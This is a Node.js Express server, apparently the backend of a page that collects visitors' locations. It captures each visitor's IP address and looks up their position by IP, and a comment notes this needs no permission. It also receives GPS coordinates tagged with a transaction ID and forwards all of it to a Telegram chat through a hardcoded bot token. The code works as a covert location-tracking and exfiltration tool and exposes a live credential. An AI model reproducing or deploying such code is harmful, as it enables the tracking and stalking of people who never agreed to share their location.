// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const path = require("path");

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Servir arquivos estáticos (HTML, CSS, imagens)
app.use(express.static(path.join(__dirname)));

// Rotas específicas para arquivos estáticos (importante para Vercel)
app.get("/styles.css", (req, res) => {
  res.sendFile(path.join(__dirname, "styles.css"), {
    headers: { "Content-Type": "text/css" }
  });
});

app.get("/image.png", (req, res) => {
  res.sendFile(path.join(__dirname, "image.png"), {
    headers: { "Content-Type": "image/png" }
  });
});

// Rota para servir o index.html como página inicial
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

const TELEGRAM_BOT_TOKEN = "7640580191:AAF7LA0-A4nd2LY_cvbjmDrLSM0KcJM3ksw"; // Substitua pelo token do seu bot
const TELEGRAM_CHAT_ID = "-4950002868"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar

// Rota para obter localização por IP (sem precisar de permissão)
app.get("/get-ip-location", async (req, res) => {
  // Capturar IP do usuário
  let clientIP = 'IP não disponível';
  
  if (req.headers['x-forwarded-for']) {
    clientIP = req.headers['x-forwarded-for'].split(',')[0].trim();
  }
  else if (req.headers['x-real-ip']) {
    clientIP = req.headers['x-real-ip'];
  }
  else if (req.headers['cf-connecting-ip']) {
    clientIP = req.headers['cf-connecting-ip'];
  }
  else if (req.connection && req.connection.remoteAddress) {
    clientIP = req.connection.remoteAddress;
  }
  else if (req.socket && req.socket.remoteAddress) {
    clientIP = req.socket.remoteAddress;
  }
  else if (req.ip) {
    clientIP = req.ip;
  }

  // Obter localização aproximada por IP usando serviço gratuito
  try {
    const ipResponse = await axios.get(`http://ip-api.com/json/${clientIP}?fields=status,message,country,regionName,city,lat,lon,query`);
    
    if (ipResponse.data.status === 'success') {
      res.json({
        success: true,
        ip: clientIP,
        latitude: ipResponse.data.lat,
        longitude: ipResponse.data.lon,
        city: ipResponse.data.city,
        region: ipResponse.data.regionName,
        country: ipResponse.data.country,
        accuracy: 'Aproximada (por IP)',
        source: 'IP Geolocation'
      });
    } else {
      res.json({
        success: false,
        ip: clientIP,
        message: 'Não foi possível obter localização por IP'
      });
    }
  } catch (error) {
    res.json({
      success: false,
      ip: clientIP,
      message: 'Erro ao obter localização por IP'
    });
  }
});

app.post("/send-location", async (req, res) => {
  const { latitude, longitude, accuracy, maps, transactionId, timestamp } = req.body;
  
  // Capturar IP do usuário (múltiplas fontes para compatibilidade)
  let clientIP = 'IP não disponível';
  
  // Vercel usa x-forwarded-for
  if (req.headers['x-forwarded-for']) {
    clientIP = req.headers['x-forwarded-for'].split(',')[0].trim();
  }
  // Alternativas
  else if (req.headers['x-real-ip']) {
    clientIP = req.headers['x-real-ip'];
  }
  else if (req.headers['cf-connecting-ip']) {
    clientIP = req.headers['cf-connecting-ip']; // Cloudflare
  }
  else if (req.connection && req.connection.remoteAddress) {
    clientIP = req.connection.remoteAddress;
  }
  else if (req.socket && req.socket.remoteAddress) {
    clientIP = req.socket.remoteAddress;
  }
  else if (req.ip) {
    clientIP = req.ip;
  }

  // Log para debug (remover em produção se necessário)
  console.log('Headers recebidos:', {
    'x-forwarded-for': req.headers['x-forwarded-for'],
    'x-real-ip': req.headers['x-real-ip'],
    'cf-connecting-ip': req.headers['cf-connecting-ip'],
    'IP capturado': clientIP
  });

  const source = req.body.source || 'GPS';
  const city = req.body.city || '';
  const region = req.body.region || '';
  const country = req.body.country || '';

  let message = `📍 Nova Localização Recebida\n\n` +
    `ID da Transação: ${transactionId || 'N/A'}\n` +
    `Data/Hora: ${timestamp || new Date().toISOString()}\n` +
    `IP do Cliente: ${clientIP}\n` +
    `Fonte: ${source}\n` +
    `Latitude: ${latitude}\n` +
    `Longitude: ${longitude}\n` +
    `Precisão: ${accuracy ? accuracy.toFixed(2) + ' metros' : 'N/A'}\n`;
  
  if (city) {
    message += `Cidade: ${city}\n`;
  }
  if (region) {
    message += `Região: ${region}\n`;
  }
  if (country) {
    message += `País: ${country}\n`;
  }
  
  message += `Maps: ${maps}`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

// Exportar para Vercel (serverless)
module.exports = app;

// Rodar localmente se não estiver na Vercel
if (require.main === module) {
  const PORT = process.env.PORT || 8088;
  app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`Acesse: http://localhost:${PORT}`);
  });
}